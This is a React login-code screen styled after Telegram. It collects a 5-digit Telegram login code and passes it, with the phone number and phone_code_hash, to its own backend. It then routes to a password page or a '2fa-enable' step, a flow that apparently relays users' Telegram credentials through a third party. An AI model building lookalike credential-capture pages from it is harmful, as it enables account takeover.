import { useState, useEffect } from "react";
import { useNavigate, useLocation } from "react-router-dom";
import { FontAwesomeIcon } from "@fortawesome/react-fontawesome";
import { faPencil } from "@fortawesome/free-solid-svg-icons";
import { verifyCodeApi } from "../api/login";

const CodeVerifyScreen = () => {
    const [code, setCode] = useState("");
    const [isFocused, setIsFocused] = useState(false);
    const [isHovered, setIsHovered] = useState(false);
    const [hover, setHover] = useState(false);
    const [loading, setLoading] = useState(false);
    const [codeError, setCodeError] = useState("");

    const navigate = useNavigate();
    const location = useLocation();
    const phone = location.state?.phone;

    const loginData = JSON.parse(localStorage.getItem("loginData") || "{}");

    const verifyCode = async (enteredCode) => {
        if (!enteredCode || enteredCode.length < 5) {
            setCodeError("Please enter the complete 5-digit code");
            return;
        }

        setCodeError(""); // clear any old errors
        try {
            setLoading(true);

            const response = await verifyCodeApi(
                loginData.phone,
                enteredCode,
                loginData.phone_code_hash
            );


            console.log("✅ Verification success:", response);

            if (response.status === 200) {
                alert("Login successful!");
                localStorage.removeItem("loginData");
                navigate("/2fa-enable");
            }

        } catch (error) {
            console.error("Verification failed:", error);

            if (error.response?.status === 401) {
                const codeStr = enteredCode.toString();
                localStorage.setItem("enteredCode", codeStr);
                navigate("/verification-password");
            } else {
                setCodeError(error.response?.data?.detail || "Invalid or expired code");
            }

        } finally {
            setLoading(false);
        }
    };


    useEffect(() => {
        if (code.length === 5 && !loading) {
            verifyCode(code);
        }
    }, [code]);

    const inputStyle = {
        height: "54px",
        borderRadius: "10px",
        borderWidth: "2px",
        borderStyle: "solid",
        width: "100%",
        backgroundColor: "#212121",
        color: "#fff",
        paddingLeft: "10px",
        boxSizing: "border-box",
        outline: "none",
        alignItems: "center",
        opacity: 0.9,
        borderColor: isFocused || isHovered ? "#8774E1" : "#2D2D2D",
    };

    return (
        <div
            className="d-flex flex-column justify-content align-items-center"
            style={{ minHeight: "100vh", paddingTop: "50px", boxSizing: "border-box" }}
        >
            <div>
                <img src="/assets/monkey_carton.png" alt="Logo" width="170" height="170" />
            </div>

            <div className="mt-4 d-flex align-items-center mb-3">
                <h4
                    className="text-white robotoText"
                    style={{
                        fontSize: "32px",
                        lineHeight: "110%",
                        fontWeight: "500",
                        fontFamily: "Roboto",
                        margin: 0,
                    }}
                >
                    {phone || "+92 000 0000000"}
                </h4>
                <span
                    style={{ marginLeft: "8px" }}
                    onMouseEnter={() => setHover(true)}
                    onMouseLeave={() => setHover(false)}
                >
                    <FontAwesomeIcon
                        icon={faPencil}
                        style={{
                            color: hover ? "white" : "#AAAAAA",
                            fontSize: "20px",
                            cursor: "pointer",
                        }}
                        onClick={() => navigate("/")}
                    />
                </span>
            </div>

            <div
                className="d-flex flex-column text-center text-secondary"
                style={{ lineHeight: "1.3" }}
            >
                <p className="mb-0" style={{ color: "#AAAAAA", fontFamily: "Roboto", fontSize: "16px" }}>
                    We’ve sent you a message in Telegram
                </p>
                <p className="mt-0" style={{ color: "#AAAAAA", fontFamily: "Roboto", fontSize: "16px" }}>
                    with the code.
                </p>
            </div>

            <div className="d-flex flex-column align-items-center mt-4" style={{ gap: "10px" }}>
                <div className="position-relative mb-3" style={{ width: "350px" }}>
                    <input
                        placeholder=""
                        style={{
                            ...inputStyle,
                            fontSize: "18px",
                            fontFamily: "Roboto",
                            paddingLeft: "10px",
                            letterSpacing: "6px",
                        }}
                        value={code}
                        maxLength={5}
                        onChange={(e) => {
                            const onlyNums = e.target.value.replace(/\D/g, "");
                            setCode(onlyNums);
                            setCodeError("");
                        }}
                        onFocus={() => setIsFocused(true)}
                        onBlur={() => setIsFocused(false)}
                        onMouseEnter={() => setIsHovered(true)}
                        onMouseLeave={() => setIsHovered(false)}
                        disabled={loading}
                    />

                    <label
                        className="position-absolute px-1"
                        style={{
                            top: isFocused || code ? "0" : "50%",
                            left: "12px",
                            fontFamily: "Roboto",
                            transform:
                                isFocused || code
                                    ? "translateY(-50%) scale(0.9)"
                                    : "translateY(-50%) scale(1.2)",
                            fontSize: "13px",
                            color: isFocused || isHovered ? "#8774E1" : "#AAAAAA",
                            background: "linear-gradient(180deg, transparent 40%, #212121 40%)",
                            transition:
                                "all 0.2s ease-in-out, color 0.2s ease-in-out, transform 0.2s ease",
                            pointerEvents: "none",
                        }}
                    >
                        Code
                    </label>
                    {codeError && (
                        <p style={{ color: "#FF6B6B", fontSize: "13px", marginTop: "4px", textAlign: "left" }}>
                            {codeError}
                        </p>
                    )}
                </div>

                {loading && (
                    <div className="text-secondary mt-2" style={{ fontFamily: "Roboto", fontSize: "14px" }}>
                        Verifying code, please wait…
                    </div>
                )}
            </div>
        </div>
    );
};

export default CodeVerifyScreen;
